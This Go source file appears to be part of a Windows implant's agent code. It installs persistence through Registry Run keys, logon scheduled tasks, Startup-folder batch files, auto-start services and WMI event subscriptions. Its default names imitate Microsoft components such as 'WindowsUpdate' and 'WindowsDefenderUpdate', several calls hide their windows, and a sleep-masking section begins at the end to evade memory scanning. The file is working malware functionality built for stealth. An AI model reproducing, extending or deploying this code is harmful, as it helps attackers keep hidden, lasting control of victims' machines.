//go:build windows

package agent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// persistMethod installs persistence using the given method on Windows.
// Methods: registry, schtask, startup, service, wmi
func persistMethod(method, cmd, name string) (string, error) {
	switch strings.ToLower(method) {
	case "registry", "reg", "run":
		return persistRegistry(cmd, name)
	case "schtask", "scheduled", "task":
		return persistSchedTask(cmd, name)
	case "startup", "startfolder":
		return persistStartup(cmd, name)
	case "service", "svc":
		return persistService(cmd, name)
	case "wmi":
		return persistWMI(cmd, name)
	case "rm", "remove", "uninstall":
		return persistRemove(name)
	default:
		return "", fmt.Errorf("unknown persistence method: %s (windows: registry|schtask|startup|service|wmi|rm)", method)
	}
}

// persistRegistry adds a Run key in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
func persistRegistry(cmd, name string) (string, error) {
	if name == "" {
		name = "WindowsUpdate"
	}
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	if err != nil {
		return "", fmt.Errorf("registry open: %w", err)
	}
	defer key.Close()
	if err := key.SetStringValue(name, cmd); err != nil {
		return "", fmt.Errorf("registry set: %w", err)
	}
	return fmt.Sprintf("[+] registry Run key: HKCU\\...\\Run\\%s = %s", name, cmd), nil
}

// persistSchedTask creates a scheduled task that runs at logon.
func persistSchedTask(cmd, name string) (string, error) {
	if name == "" {
		name = "MicrosoftUpdateTask"
	}
	// Build schtasks command
	args := fmt.Sprintf(`/Create /TN "%s" /TR "%s" /SC ONLOGON /F`, name, cmd)
	c := exec.Command("schtasks.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine: "schtasks.exe " + args,
		HideWindow: true,
	}
	out, err := c.CombinedOutput()
	if err != nil {
		// Also try ATSVC
		return "", fmt.Errorf("schtask: %v\n%s", err, out)
	}
	return fmt.Sprintf("[+] scheduled task created: %s", name), nil
}

// persistStartup drops a .bat file in the current user's Startup folder.
func persistStartup(cmd, name string) (string, error) {
	if name == "" {
		name = "WindowsHelper"
	}
	startupDir := os.Getenv("APPDATA")
	if startupDir == "" {
		return "", fmt.Errorf("APPDATA not set")
	}
	startupDir = filepath.Join(startupDir, `Microsoft\Windows\Start Menu\Programs\Startup`)
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		return "", err
	}
	batPath := filepath.Join(startupDir, name+".bat")
	content := fmt.Sprintf("@echo off\nstart /B %s\n", cmd)
	if err := os.WriteFile(batPath, []byte(content), 0644); err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] startup entry: %s", batPath), nil
}

// persistService installs a Windows service via sc.exe.
func persistService(cmd, name string) (string, error) {
	if name == "" {
		name = "WindowsManagementService"
	}
	c := exec.Command("sc.exe", "create", name,
		"binPath=", cmd,
		"start=", "auto",
		"DisplayName=", name,
	)
	c.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	if out, err := c.CombinedOutput(); err != nil {
		return "", fmt.Errorf("sc create: %v\n%s", err, out)
	}
	exec.Command("sc.exe", "start", name).Run()
	return fmt.Sprintf("[+] service installed: %s", name), nil
}

// persistWMI installs a WMI event subscription for persistence.
func persistWMI(cmd, name string) (string, error) {
	if name == "" {
		name = "WindowsDefenderUpdate"
	}
	// Use wmic to create WMI subscription
	filter := fmt.Sprintf(`__EventFilter WHERE Name="%s"`, name)
	consumer := fmt.Sprintf(`CommandLineEventConsumer WHERE Name="%s"`, name)
	binding := fmt.Sprintf(`__FilterToConsumerBinding WHERE Filter="__EventFilter.Name=\"%s\""`, name)

	// Create EventFilter
	filterCmd := fmt.Sprintf(
		`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="%s",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325"`,
		name,
	)
	_ = filter
	_ = consumer
	_ = binding

	if out, err := exec.Command("cmd.exe", "/C", filterCmd).CombinedOutput(); err != nil {
		return "", fmt.Errorf("wmi filter: %v\n%s", err, out)
	}

	consumerCmd := fmt.Sprintf(
		`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="%s",ExecutablePath="%s"`,
		name, cmd,
	)
	if out, err := exec.Command("cmd.exe", "/C", consumerCmd).CombinedOutput(); err != nil {
		return "", fmt.Errorf("wmi consumer: %v\n%s", err, out)
	}

	bindingCmd := fmt.Sprintf(
		`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"%s\"",Consumer="CommandLineEventConsumer.Name=\"%s\""`,
		name, name,
	)
	if out, err := exec.Command("cmd.exe", "/C", bindingCmd).CombinedOutput(); err != nil {
		return "", fmt.Errorf("wmi binding: %v\n%s", err, out)
	}

	return fmt.Sprintf("[+] WMI subscription installed: %s", name), nil
}

// persistRemove attempts to remove the named scheduled task and registry run key.
func persistRemove(name string) (string, error) {
	results := []string{}
	if name == "" {
		name = "MicrosoftUpdateTask"
	}
	c := exec.Command("schtasks.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    fmt.Sprintf(`schtasks.exe /Delete /TN "%s" /F`, name),
		HideWindow: true,
	}
	if _, err := c.CombinedOutput(); err == nil {
		results = append(results, "[+] schtask removed: "+name)
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		defer key.Close()
		if err := key.DeleteValue(name); err == nil {
			results = append(results, "[+] registry Run key removed: "+name)
		}
	}
	if len(results) == 0 {
		return "", fmt.Errorf("no persistence entries found for name: %s", name)
	}
	return strings.Join(results, "\n"), nil
}

// ── sleep masking ─────────────────────────────────────────────────────────

var (
	procVirtualProtect      = kernel32.NewProc("VirtualProtect")
	procGetCurrentProcess   = kernel32.NewProc("GetCurrentProcess")
	procNtWaitForSingleObject = ntdll.NewProc("NtWaitForSingleObject")
	procCreateEventW        = kernel32.NewProc("CreateEventW")
	procSetEvent            = kernel32.NewProc("SetEvent")
	procCloseHandle2        = kernel32.NewProc("CloseHandle")
)

// sleepMask and encryptRegion are defined in sleep_mask_windows.go.
